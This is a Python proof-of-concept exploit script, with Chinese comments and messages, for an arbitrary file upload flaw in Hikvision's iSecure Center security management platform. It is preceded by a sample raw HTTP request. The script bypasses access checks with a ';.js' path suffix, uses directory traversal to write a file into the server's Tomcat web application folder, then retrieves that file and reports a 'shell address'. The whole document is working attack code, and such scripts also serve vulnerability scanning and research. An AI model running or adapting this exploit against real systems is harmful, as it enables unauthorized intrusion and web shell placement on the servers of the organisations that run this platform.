# POST /center/api/files;.js HTTP/1.1
# Host: x.x.x.x
# User-Agent: python-requests/2.31.0
# Accept-Encoding: gzip, deflate
# Accept: */*
# Connection: close
# Content-Length: 258
# Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4
#
# --e54e7e5834c8c50e92189959fe7227a4
# Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt"
# Content-Type: application/octet-stream
#
# 9YPQ3I3ZS






#!usr/bin/env python
# *-* coding:utf-8 *-*
import sys
import requests
import string
import random
import urllib3
urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080', 
    'https': 'http://127.0.0.1:8080', #127.0.0.1:8080 代理，方便burpsuit抓包
}

def run(arg):
    try:
        flag=''.join(random.choices(string.ascii_uppercase + string.digits, k = 9))
        filename=''.join(random.choices(string.ascii_uppercase + string.digits, k = 10))
        vuln_url=arg+"center/api/files;.js"
        headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
                 'Accept': '*/*',
                 'Content-Type': 'application/x-www-form-urlencoded'}
        file = {'file': (f'../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{filename}.txt', flag, 'application/octet-stream')}
        r = requests.post(vuln_url, files=file, timeout=15, verify=False, proxies=proxies)
        if r.status_code==200 and "webapps/clusterMgr" in r.text:

            payload=f"clusterMgr/{filename}.txt;.js"
            url=arg+payload
            r2 = requests.get(url, timeout=15, verify=False, proxies=proxies)
            if r2.status_code==200 and flag in r2.text:

                print('\033[1;31;40m')
                print(arg+f":存在海康威视isecure center 综合安防管理平台存在任意文件上传漏洞\nshell地址：{url}")
                print('\033[0m')



        else:
            print(arg+":不存在漏洞")
    except:
        print(arg+":不存在漏洞")


if __name__ == '__main__':
     url=sys.argv[1]
     run(url)
